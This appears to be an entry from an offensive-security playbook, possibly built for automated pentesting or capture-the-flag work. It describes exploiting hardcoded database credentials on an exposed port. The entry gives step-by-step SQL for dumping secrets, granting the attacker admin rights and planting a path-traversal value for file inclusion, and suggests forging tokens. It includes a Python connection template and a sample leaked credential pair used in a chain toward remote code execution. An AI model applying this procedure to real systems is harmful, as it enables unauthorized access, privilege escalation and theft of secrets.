---
name: exposed_db_credentials_direct_manipulation
vuln_type: information_disclosure
sub_technique: exposed_credentials
category: exploitation
safety_level: safe
---

# Hardcoded Db Credentials With Exposed Port → Direct Database Manipulation

## When to Apply

Application source code contains hardcoded database credentials (in config files, ORM configs, or PHP/Python source), AND the database port is exposed externally (via docker-compose port mapping or firewall misconfiguration). Attackers connect directly to the DB, bypassing all application-level access controls, input validation, and broken sanitization. Enables: reading secrets, modifying user roles, inserting arbitrary records, and setting up further exploitation (e.g., LFI path injection).

## Prerequisites

- DB credentials visible in source code (dbutil.py, config.php, .env, docker-compose.yml, etc.)
- Database port reachable from attacker's network (docker-compose ports: mapping, no firewall)
- DB user has sufficient privileges (INSERT, UPDATE, SELECT at minimum)

## Steps

1. Identify DB credentials in source: connection strings, config files, docker-compose.yml
2. Confirm DB port is accessible: connect from attacker machine to host:port
3. Enumerate the schema: SHOW TABLES, DESCRIBE table_name
4. Read application secrets: SELECT * FROM config (secret_key, API keys, etc.)
5. Escalate privileges: UPDATE user SET is_admin=1 WHERE username='attacker'
6. Inject exploit data: UPDATE product SET product_cache='../image/malicious.png'
7. Forge auth tokens using extracted secrets if needed

## Code Template

```
import mysql.connector
conn = mysql.connector.connect(host='{host}', port={db_port},
    user='{db_user}', password='{db_pass}', database='{db_name}')
cur = conn.cursor()
# Read secrets
cur.execute('SELECT * FROM config')
# Modify data for further exploitation
cur.execute("UPDATE product SET product_cache=%s WHERE pid=%s", (payload_path, pid))
conn.commit()
```

## Examples

### Example 1

- **db_type**: MySQL
- **credentials_location**: dbutil.py (Python) + upload_action.php (PHP)
- **exposed_port**: 23434 → MySQL 3306
- **privileges**: ALL PRIVILEGES on ymp.*

docker-compose.yml maps MySQL port 23434:3306 externally. Credentials ymp/H4ppyH4ppyM0n3y found in both Python dbutil.py and PHP sources. Combined with polyglot PNG upload + LFI include for full RCE chain.
